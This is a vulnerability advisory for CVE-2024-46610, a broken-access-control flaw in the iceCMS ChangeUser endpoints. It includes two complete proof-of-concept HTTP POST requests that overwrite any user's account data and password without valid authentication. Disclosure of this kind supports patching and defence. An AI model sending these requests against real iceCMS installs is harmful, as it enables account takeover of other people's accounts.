
**[CVE-ID]**

CVE-2024-46610

**[PRODUCT]**

icecms

**[Vendor of Product]**

https://github.com/Thecosy/iceCMS?tab=readme-ov-file

**[VERSION]**

icecms <=3.4.7

**[Vulnerability Type]**

Incorrect Access Control

**[Description]**

Unauthorized modification of any user information, including passwords.

The vulnerability is in the ChangeUser function in UserController.java. The route of the function is @PostMapping("/ChangeUser/{jwt}"). This interface does not perform authentication processing. It only detects the jwt, and its jwt detection logic is problematic. As a result, attackers can directly request this interface to modify the information of any user, including passwords.

![pic1](/icecms/PIC/CVE-2024-46610-1.png)

The code logic is as follows:
There is a problem with the jwt detection logic in the code. If the jwt is invalid or illegal, an error should be reported directly or a return should be made directly instead of just setting a message.

![pic2](/icecms/PIC/CVE-2024-46610-2.png)


## POC：

Use Burpsuite to send the login data packet as follows. 
Through this interface, the information of any user can be directly modified.
```
POST /User/ChangeUser/s HTTP/1.1
Host: localhost:8181
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:9528
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Content-Type:application/json
Referer: http://localhost:9528/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 621

{"userId":65,"openid":null,"userage":null,"intro":"这个人很懒，什么都没有留下！","gender":"","name":"alan",
"role":"会员",
"username":"test","password":"$argon2i$v=19$m=65536,t=3,p=1$Bd4DS8mtP2ZM3DInyCT/sg$pQixU/obFvmj9wZXu658pZ4G5epINkfdET17xx8X3R8","email":"1231","role":"testa","profile":"https://img2.woyaogexing.com/2022/07/17/5bbaa5352282a8f7!400x400.jpg","status":null,"createTime":"2024-09-05 17:15:08","lastLogin":"2024-09-05T09:15:37.000+00:00","vipValidDate":null,"vipExpireDate":null,"integral":null,"vipDisableTip":true,"height":"","birthday":"","academic":"","monthly":"","permanent":""}

```
![pic3](/icecms/PIC/CVE-2024-46610-3.png)



 Directly modify users. And the password can be directly set as plaintext, and the plaintext will be stored in the database.
For example, sending a packet:
```
POST /User/ChangeUser/a HTTP/1.1
Host: localhost:8181
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:9528
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Content-Type:application/json
Referer: http://localhost:9528/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 533

{"userId":67,"openid":null,"userage":null,"intro":"这个人很懒，什么都没有留下！","gender":"","name":"test2",
"role":"会员",
"username":"test2","password":"123456","email":"1231","role":"testa","profile":"https://img2.woyaogexing.com/2022/07/17/5bbaa5352282a8f7!400x400.jpg","status":null,"createTime":"2024-09-05 17:15:08","lastLogin":"2024-09-05T09:15:37.000+00:00","vipValidDate":null,"vipExpireDate":null,"integral":null,"vipDisableTip":true,"height":"","birthday":"","academic":"","monthly":"","permanent":""}

```

![pic4](/icecms/PIC/CVE-2024-46610-4.png)

in the Database：

![pic5](/icecms/PIC/CVE-2024-46610-5.png)

There is also an interface with the same problem. The interface is as follows: /Websuser/ChangeUser/s.
**in WebUserController.java,ChangeUser Function.**
